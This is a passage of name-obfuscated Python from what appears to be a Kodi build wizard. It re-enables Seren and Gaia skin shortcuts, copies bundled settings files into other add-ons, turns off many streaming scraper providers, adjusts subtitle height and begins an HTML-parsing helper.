		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1194
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1197
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1198
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1202
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1203
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1204
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1222
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1225
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1226
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1230
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1231
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1232
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1250
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1253
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1254
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1258
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1259
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1260
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1278
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1281
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1282
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1285
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1286
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1287
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1305
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1308
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1309
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1311
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1312
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1313
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1331
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1334
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1335
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1337
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1338
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1339
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1357
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1360
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1361
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1364
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1365
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1366
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1384
    with open (O00O000O00O0O0000 ,'w')as O00O0OOOOOOO00O00 :#line:1387
      O00O0OOOOOOO00O00 .write (OO0OO0O0OO0OOOOOO )#line:1388
def rdbuildinstallON ():#line:1391
    try :#line:1393
       O000O0OOOOO0OOO00 =ADDONPATH +"/resources/rd/victory.xml"#line:1394
       OOO000000000OOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1395
       copyfile (O000O0OOOOO0OOO00 ,OOO000000000OOO00 )#line:1397
       O000O0OOOOO0OOO00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1399
       OOO000000000OOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1400
       copyfile (O000O0OOOOO0OOO00 ,OOO000000000OOO00 )#line:1402
       O000O0OOOOO0OOO00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1404
       OOO000000000OOO00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1405
       copyfile (O000O0OOOOO0OOO00 ,OOO000000000OOO00 )#line:1407
       O000O0OOOOO0OOO00 =ADDONPATH +"/resources/rd/Splash.png"#line:1410
       OOO000000000OOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1411
       copyfile (O000O0OOOOO0OOO00 ,OOO000000000OOO00 )#line:1413
    except :#line:1415
       pass #line:1416
def rdbuild ():#line:1426
	O00O0O0OOOO0O0O00 =(ADDON .getSetting ("auto_rd"))#line:1427
	if O00O0O0OOOO0O0O00 =='true':#line:1428
		OOO00OOO0O0O0O000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1429
		OOO00OOO0O0O0O000 .setSetting ('all_t','0')#line:1430
		OOO00OOO0O0O0O000 .setSetting ('rd_menu_enable','false')#line:1431
		OOO00OOO0O0O0O000 .setSetting ('magnet_bay','false')#line:1432
		OOO00OOO0O0O0O000 .setSetting ('magnet_extra','false')#line:1433
		OOO00OOO0O0O0O000 .setSetting ('rd_only','false')#line:1434
		OOO00OOO0O0O0O000 .setSetting ('ftp','false')#line:1436
		OOO00OOO0O0O0O000 .setSetting ('fp','false')#line:1437
		OOO00OOO0O0O0O000 .setSetting ('filter_fp','false')#line:1438
		OOO00OOO0O0O0O000 .setSetting ('fp_size_en','false')#line:1439
		OOO00OOO0O0O0O000 .setSetting ('afdah','false')#line:1440
		OOO00OOO0O0O0O000 .setSetting ('ap2s','false')#line:1441
		OOO00OOO0O0O0O000 .setSetting ('cin','false')#line:1442
		OOO00OOO0O0O0O000 .setSetting ('clv','false')#line:1443
		OOO00OOO0O0O0O000 .setSetting ('cmv','false')#line:1444
		OOO00OOO0O0O0O000 .setSetting ('dl20','false')#line:1445
		OOO00OOO0O0O0O000 .setSetting ('esc','false')#line:1446
		OOO00OOO0O0O0O000 .setSetting ('extra','false')#line:1447
		OOO00OOO0O0O0O000 .setSetting ('film','false')#line:1448
		OOO00OOO0O0O0O000 .setSetting ('fre','false')#line:1449
		OOO00OOO0O0O0O000 .setSetting ('fxy','false')#line:1450
		OOO00OOO0O0O0O000 .setSetting ('genv','false')#line:1451
		OOO00OOO0O0O0O000 .setSetting ('getgo','false')#line:1452
		OOO00OOO0O0O0O000 .setSetting ('gold','false')#line:1453
		OOO00OOO0O0O0O000 .setSetting ('gona','false')#line:1454
		OOO00OOO0O0O0O000 .setSetting ('hdmm','false')#line:1455
		OOO00OOO0O0O0O000 .setSetting ('hdt','false')#line:1456
		OOO00OOO0O0O0O000 .setSetting ('icy','false')#line:1457
		OOO00OOO0O0O0O000 .setSetting ('ind','false')#line:1458
		OOO00OOO0O0O0O000 .setSetting ('iwi','false')#line:1459
		OOO00OOO0O0O0O000 .setSetting ('jen_free','false')#line:1460
		OOO00OOO0O0O0O000 .setSetting ('kiss','false')#line:1461
		OOO00OOO0O0O0O000 .setSetting ('lavin','false')#line:1462
		OOO00OOO0O0O0O000 .setSetting ('los','false')#line:1463
		OOO00OOO0O0O0O000 .setSetting ('m4u','false')#line:1464
		OOO00OOO0O0O0O000 .setSetting ('mesh','false')#line:1465
		OOO00OOO0O0O0O000 .setSetting ('mf','false')#line:1466
		OOO00OOO0O0O0O000 .setSetting ('mkvc','false')#line:1467
		OOO00OOO0O0O0O000 .setSetting ('mjy','false')#line:1468
		OOO00OOO0O0O0O000 .setSetting ('hdonline','false')#line:1469
		OOO00OOO0O0O0O000 .setSetting ('moviex','false')#line:1470
		OOO00OOO0O0O0O000 .setSetting ('mpr','false')#line:1471
		OOO00OOO0O0O0O000 .setSetting ('mvg','false')#line:1472
		OOO00OOO0O0O0O000 .setSetting ('mvl','false')#line:1473
		OOO00OOO0O0O0O000 .setSetting ('mvs','false')#line:1474
		OOO00OOO0O0O0O000 .setSetting ('myeg','false')#line:1475
		OOO00OOO0O0O0O000 .setSetting ('ninja','false')#line:1476
		OOO00OOO0O0O0O000 .setSetting ('odb','false')#line:1477
		OOO00OOO0O0O0O000 .setSetting ('ophd','false')#line:1478
		OOO00OOO0O0O0O000 .setSetting ('pks','false')#line:1479
		OOO00OOO0O0O0O000 .setSetting ('prf','false')#line:1480
		OOO00OOO0O0O0O000 .setSetting ('put18','false')#line:1481
		OOO00OOO0O0O0O000 .setSetting ('req','false')#line:1482
		OOO00OOO0O0O0O000 .setSetting ('rftv','false')#line:1483
		OOO00OOO0O0O0O000 .setSetting ('rltv','false')#line:1484
		OOO00OOO0O0O0O000 .setSetting ('sc','false')#line:1485
		OOO00OOO0O0O0O000 .setSetting ('seehd','false')#line:1486
		OOO00OOO0O0O0O000 .setSetting ('showbox','false')#line:1487
		OOO00OOO0O0O0O000 .setSetting ('shuid','false')#line:1488
		OOO00OOO0O0O0O000 .setSetting ('sil_gh','false')#line:1489
		OOO00OOO0O0O0O000 .setSetting ('spv','false')#line:1490
		OOO00OOO0O0O0O000 .setSetting ('subs','false')#line:1491
		OOO00OOO0O0O0O000 .setSetting ('tvs','false')#line:1492
		OOO00OOO0O0O0O000 .setSetting ('tw','false')#line:1493
		OOO00OOO0O0O0O000 .setSetting ('upto','false')#line:1494
		OOO00OOO0O0O0O000 .setSetting ('vel','false')#line:1495
		OOO00OOO0O0O0O000 .setSetting ('vex','false')#line:1496
		OOO00OOO0O0O0O000 .setSetting ('vidc','false')#line:1497
		OOO00OOO0O0O0O000 .setSetting ('w4hd','false')#line:1498
		OOO00OOO0O0O0O000 .setSetting ('wav','false')#line:1499
		OOO00OOO0O0O0O000 .setSetting ('wf','false')#line:1500
		OOO00OOO0O0O0O000 .setSetting ('wse','false')#line:1501
		OOO00OOO0O0O0O000 .setSetting ('wss','false')#line:1502
		OOO00OOO0O0O0O000 .setSetting ('wsse','false')#line:1503
		OOO00OOO0O0O0O000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1504
		OOO00OOO0O0O0O000 .setSetting ('debrid.only','true')#line:1505
		OOO00OOO0O0O0O000 .setSetting ('hosts.captcha','false')#line:1506
		OOO00OOO0O0O0O000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1507
		OOO00OOO0O0O0O000 .setSetting ('provider.123moviehd','false')#line:1508
		OOO00OOO0O0O0O000 .setSetting ('provider.300mbdownload','false')#line:1509
		OOO00OOO0O0O0O000 .setSetting ('provider.alltube','false')#line:1510
		OOO00OOO0O0O0O000 .setSetting ('provider.allucde','false')#line:1511
		OOO00OOO0O0O0O000 .setSetting ('provider.animebase','false')#line:1512
		OOO00OOO0O0O0O000 .setSetting ('provider.animeloads','false')#line:1513
		OOO00OOO0O0O0O000 .setSetting ('provider.animetoon','false')#line:1514
		OOO00OOO0O0O0O000 .setSetting ('provider.bnwmovies','false')#line:1515
		OOO00OOO0O0O0O000 .setSetting ('provider.boxfilm','false')#line:1516
		OOO00OOO0O0O0O000 .setSetting ('provider.bs','false')#line:1517
		OOO00OOO0O0O0O000 .setSetting ('provider.cartoonhd','false')#line:1518
		OOO00OOO0O0O0O000 .setSetting ('provider.cdahd','false')#line:1519
		OOO00OOO0O0O0O000 .setSetting ('provider.cdax','false')#line:1520
		OOO00OOO0O0O0O000 .setSetting ('provider.cine','false')#line:1521
		OOO00OOO0O0O0O000 .setSetting ('provider.cinenator','false')#line:1522
		OOO00OOO0O0O0O000 .setSetting ('provider.cmovieshdbz','false')#line:1523
		OOO00OOO0O0O0O000 .setSetting ('provider.coolmoviezone','false')#line:1524
		OOO00OOO0O0O0O000 .setSetting ('provider.ddl','false')#line:1525
		OOO00OOO0O0O0O000 .setSetting ('provider.deepmovie','false')#line:1526
		OOO00OOO0O0O0O000 .setSetting ('provider.ekinomaniak','false')#line:1527
		OOO00OOO0O0O0O000 .setSetting ('provider.ekinotv','false')#line:1528
		OOO00OOO0O0O0O000 .setSetting ('provider.filiser','false')#line:1529
		OOO00OOO0O0O0O000 .setSetting ('provider.filmpalast','false')#line:1530
		OOO00OOO0O0O0O000 .setSetting ('provider.filmwebbooster','false')#line:1531
		OOO00OOO0O0O0O000 .setSetting ('provider.filmxy','false')#line:1532
		OOO00OOO0O0O0O000 .setSetting ('provider.fmovies','false')#line:1533
		OOO00OOO0O0O0O000 .setSetting ('provider.foxx','false')#line:1534
		OOO00OOO0O0O0O000 .setSetting ('provider.freefmovies','false')#line:1535
		OOO00OOO0O0O0O000 .setSetting ('provider.freeputlocker','false')#line:1536
		OOO00OOO0O0O0O000 .setSetting ('provider.furk','false')#line:1537
		OOO00OOO0O0O0O000 .setSetting ('provider.gamatotv','false')#line:1538
		OOO00OOO0O0O0O000 .setSetting ('provider.gogoanime','false')#line:1539
		OOO00OOO0O0O0O000 .setSetting ('provider.gowatchseries','false')#line:1540
		OOO00OOO0O0O0O000 .setSetting ('provider.hackimdb','false')#line:1541
		OOO00OOO0O0O0O000 .setSetting ('provider.hdfilme','false')#line:1542
		OOO00OOO0O0O0O000 .setSetting ('provider.hdmto','false')#line:1543
		OOO00OOO0O0O0O000 .setSetting ('provider.hdpopcorns','false')#line:1544
		OOO00OOO0O0O0O000 .setSetting ('provider.hdstreams','false')#line:1545
		OOO00OOO0O0O0O000 .setSetting ('provider.horrorkino','false')#line:1547
		OOO00OOO0O0O0O000 .setSetting ('provider.iitv','false')#line:1548
		OOO00OOO0O0O0O000 .setSetting ('provider.iload','false')#line:1549
		OOO00OOO0O0O0O000 .setSetting ('provider.iwaatch','false')#line:1550
		OOO00OOO0O0O0O000 .setSetting ('provider.kinodogs','false')#line:1551
		OOO00OOO0O0O0O000 .setSetting ('provider.kinoking','false')#line:1552
		OOO00OOO0O0O0O000 .setSetting ('provider.kinow','false')#line:1553
		OOO00OOO0O0O0O000 .setSetting ('provider.kinox','false')#line:1554
		OOO00OOO0O0O0O000 .setSetting ('provider.lichtspielhaus','false')#line:1555
		OOO00OOO0O0O0O000 .setSetting ('provider.liomenoi','false')#line:1556
		OOO00OOO0O0O0O000 .setSetting ('provider.magnetdl','false')#line:1559
		OOO00OOO0O0O0O000 .setSetting ('provider.megapelistv','false')#line:1560
		OOO00OOO0O0O0O000 .setSetting ('provider.movie2k-ac','false')#line:1561
		OOO00OOO0O0O0O000 .setSetting ('provider.movie2k-ag','false')#line:1562
		OOO00OOO0O0O0O000 .setSetting ('provider.movie2z','false')#line:1563
		OOO00OOO0O0O0O000 .setSetting ('provider.movie4k','false')#line:1564
		OOO00OOO0O0O0O000 .setSetting ('provider.movie4kis','false')#line:1565
		OOO00OOO0O0O0O000 .setSetting ('provider.movieneo','false')#line:1566
		OOO00OOO0O0O0O000 .setSetting ('provider.moviesever','false')#line:1567
		OOO00OOO0O0O0O000 .setSetting ('provider.movietown','false')#line:1568
		OOO00OOO0O0O0O000 .setSetting ('provider.mvrls','false')#line:1570
		OOO00OOO0O0O0O000 .setSetting ('provider.netzkino','false')#line:1571
		OOO00OOO0O0O0O000 .setSetting ('provider.odb','false')#line:1572
		OOO00OOO0O0O0O000 .setSetting ('provider.openkatalog','false')#line:1573
		OOO00OOO0O0O0O000 .setSetting ('provider.ororo','false')#line:1574
		OOO00OOO0O0O0O000 .setSetting ('provider.paczamy','false')#line:1575
		OOO00OOO0O0O0O000 .setSetting ('provider.peliculasdk','false')#line:1576
		OOO00OOO0O0O0O000 .setSetting ('provider.pelisplustv','false')#line:1577
		OOO00OOO0O0O0O000 .setSetting ('provider.pepecine','false')#line:1578
		OOO00OOO0O0O0O000 .setSetting ('provider.primewire','false')#line:1579
		OOO00OOO0O0O0O000 .setSetting ('provider.projectfreetv','false')#line:1580
		OOO00OOO0O0O0O000 .setSetting ('provider.proxer','false')#line:1581
		OOO00OOO0O0O0O000 .setSetting ('provider.pureanime','false')#line:1582
		OOO00OOO0O0O0O000 .setSetting ('provider.putlocker','false')#line:1583
		OOO00OOO0O0O0O000 .setSetting ('provider.putlockerfree','false')#line:1584
		OOO00OOO0O0O0O000 .setSetting ('provider.reddit','false')#line:1585
		OOO00OOO0O0O0O000 .setSetting ('provider.cartoonwire','false')#line:1586
		OOO00OOO0O0O0O000 .setSetting ('provider.seehd','false')#line:1587
		OOO00OOO0O0O0O000 .setSetting ('provider.segos','false')#line:1588
		OOO00OOO0O0O0O000 .setSetting ('provider.serienstream','false')#line:1589
		OOO00OOO0O0O0O000 .setSetting ('provider.series9','false')#line:1590
		OOO00OOO0O0O0O000 .setSetting ('provider.seriesever','false')#line:1591
		OOO00OOO0O0O0O000 .setSetting ('provider.seriesonline','false')#line:1592
		OOO00OOO0O0O0O000 .setSetting ('provider.seriespapaya','false')#line:1593
		OOO00OOO0O0O0O000 .setSetting ('provider.sezonlukdizi','false')#line:1594
		OOO00OOO0O0O0O000 .setSetting ('provider.solarmovie','false')#line:1595
		OOO00OOO0O0O0O000 .setSetting ('provider.solarmoviez','false')#line:1596
		OOO00OOO0O0O0O000 .setSetting ('provider.stream-to','false')#line:1597
		OOO00OOO0O0O0O000 .setSetting ('provider.streamdream','false')#line:1598
		OOO00OOO0O0O0O000 .setSetting ('provider.streamflix','false')#line:1599
		OOO00OOO0O0O0O000 .setSetting ('provider.streamit','false')#line:1600
		OOO00OOO0O0O0O000 .setSetting ('provider.swatchseries','false')#line:1601
		OOO00OOO0O0O0O000 .setSetting ('provider.szukajkatv','false')#line:1602
		OOO00OOO0O0O0O000 .setSetting ('provider.tainiesonline','false')#line:1603
		OOO00OOO0O0O0O000 .setSetting ('provider.tainiomania','false')#line:1604
		OOO00OOO0O0O0O000 .setSetting ('provider.tata','false')#line:1607
		OOO00OOO0O0O0O000 .setSetting ('provider.trt','false')#line:1608
		OOO00OOO0O0O0O000 .setSetting ('provider.tvbox','false')#line:1609
		OOO00OOO0O0O0O000 .setSetting ('provider.ultrahd','false')#line:1610
		OOO00OOO0O0O0O000 .setSetting ('provider.video4k','false')#line:1611
		OOO00OOO0O0O0O000 .setSetting ('provider.vidics','false')#line:1612
		OOO00OOO0O0O0O000 .setSetting ('provider.view4u','false')#line:1613
		OOO00OOO0O0O0O000 .setSetting ('provider.watchseries','false')#line:1614
		OOO00OOO0O0O0O000 .setSetting ('provider.xrysoi','false')#line:1615
		OOO00OOO0O0O0O000 .setSetting ('provider.library','false')#line:1616
def fixfont ():#line:1619
	OOO0000O0O000OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1620
	OO0OO0000O00OO0O0 =json .loads (OOO0000O0O000OOO0 );#line:1622
	O00O00OOO000OOO0O =OO0OO0000O00OO0O0 ["result"]["settings"]#line:1623
	OOOOOO000OOOOO0OO =[OOOOO00O0OOOOOO0O for OOOOO00O0OOOOOO0O in O00O00OOO000OOO0O if OOOOO00O0OOOOOO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1625
	OO000O0000O00OO0O =OOOOOO000OOOOO0OO ["options"];#line:1626
	O000O0OO0OOO0O00O =OOOOOO000OOOOO0OO ["value"];#line:1627
	OOO0OO0O0O0O0O0O0 =[O0O0OO00O0O000O00 for (O0O0OO00O0O000O00 ,O000O00OOOO0O00O0 )in enumerate (OO000O0000O00OO0O )if O000O00OOOO0O00O0 ["value"]==O000O0OO0OOO0O00O ][0 ];#line:1629
	O0O0OO00OO000OOOO =(OOO0OO0O0O0O0O0O0 +1 )%len (OO000O0000O00OO0O )#line:1631
	O00OO00OOO0OOO000 =OO000O0000O00OO0O [O0O0OO00OO000OOOO ]["value"]#line:1633
	O0O0000OOOO00OOOO =OO000O0000O00OO0O [O0O0OO00OO000OOOO ]["label"]#line:1634
	O0OOOO0OO0000OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1636
	try :#line:1638
		O0OOOOO0OO0000OOO =json .loads (O0OOOO0OO0000OOO0 );#line:1639
		if O0OOOOO0OO0000OOO ["result"]!=True :#line:1641
			raise Exception #line:1642
	except :#line:1643
		sys .stderr .write ("Error switching audio output device")#line:1644
		raise Exception #line:1645
def parseDOM2 (O00OO0O0O000O00OO ,name =u"",attrs ={},ret =False ):#line:1646
	if isinstance (O00OO0O0O000O00OO ,str ):#line:1649
		try :#line:1650
			O00OO0O0O000O00OO =[O00OO0O0O000O00OO .decode ("utf-8")]#line:1651
		except :#line:1652
			O00OO0O0O000O00OO =[O00OO0O0O000O00OO ]#line:1653
	elif isinstance (O00OO0O0O000O00OO ,unicode ):#line:1654
		O00OO0O0O000O00OO =[O00OO0O0O000O00OO ]#line:1655
	elif not isinstance (O00OO0O0O000O00OO ,list ):#line:1656
		return u""#line:1657
	if not name .strip ():#line:1659
		return u""#line:1660
	OO0OOO00O0O000OO0 =[]#line:1662
	for O0OO0OOOO000OO000 in O00OO0O0O000O00OO :#line:1663
		O00OOO0OO0OO000OO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OO0OOOO000OO000 )#line:1664
		for O000OO0000O00OOOO in O00OOO0OO0OO000OO :#line:1665
			O0OO0OOOO000OO000 =O0OO0OOOO000OO000 .replace (O000OO0000O00OOOO ,O000OO0000O00OOOO .replace ("\n"," "))#line:1666
		OOO0OO00OO00O0OOO =[]#line:1668
		for O0O0000OOO000OOO0 in attrs :#line:1669
			O0OO0O0O0OOO00O00 =re .compile ('(<'+name +'[^>]*?(?:'+O0O0000OOO000OOO0 +'=[\'"]'+attrs [O0O0000OOO000OOO0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0OO0OOOO000OO000 )#line:1670
			if len (O0OO0O0O0OOO00O00 )==0 and attrs [O0O0000OOO000OOO0 ].find (" ")==-1 :#line:1671
				O0OO0O0O0OOO00O00 =re .compile ('(<'+name +'[^>]*?(?:'+O0O0000OOO000OOO0 +'='+attrs [O0O0000OOO000OOO0 ]+'.*?>))',re .M |re .S ).findall (O0OO0OOOO000OO000 )#line:1672
			if len (OOO0OO00OO00O0OOO )==0 :#line:1674
				OOO0OO00OO00O0OOO =O0OO0O0O0OOO00O00 #line:1675
				O0OO0O0O0OOO00O00 =[]#line:1676
			else :#line:1677
				OOO0O00OOOO00OO00 =range (len (OOO0OO00OO00O0OOO ))#line:1678
				OOO0O00OOOO00OO00 .reverse ()#line:1679
				for O00OO0000O0000OO0 in OOO0O00OOOO00OO00 :#line:1680
					if not OOO0OO00OO00O0OOO [O00OO0000O0000OO0 ]in O0OO0O0O0OOO00O00 :#line:1681
						del (OOO0OO00OO00O0OOO [O00OO0000O0000OO0 ])#line:1682
		if len (OOO0OO00OO00O0OOO )==0 and attrs =={}:#line:1684
			OOO0OO00OO00O0OOO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OO0OOOO000OO000 )#line:1685
			if len (OOO0OO00OO00O0OOO )==0 :#line:1686
				OOO0OO00OO00O0OOO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OO0OOOO000OO000 )#line:1687
		if isinstance (ret ,str ):#line:1689
			O0OO0O0O0OOO00O00 =[]#line:1690
			for O000OO0000O00OOOO in OOO0OO00OO00O0OOO :#line:1691
				O000000OOO000OO00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O000OO0000O00OOOO )#line:1692
				if len (O000000OOO000OO00 )==0 :#line:1693
					O000000OOO000OO00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O000OO0000O00OOOO )#line:1694
				for OO0O0OOO0O0O0OOO0 in O000000OOO000OO00 :#line:1695
					O00OOO00OO00O000O =OO0O0OOO0O0O0OOO0 [0 ]#line:1696
					if O00OOO00OO00O000O in "'\"":#line:1697
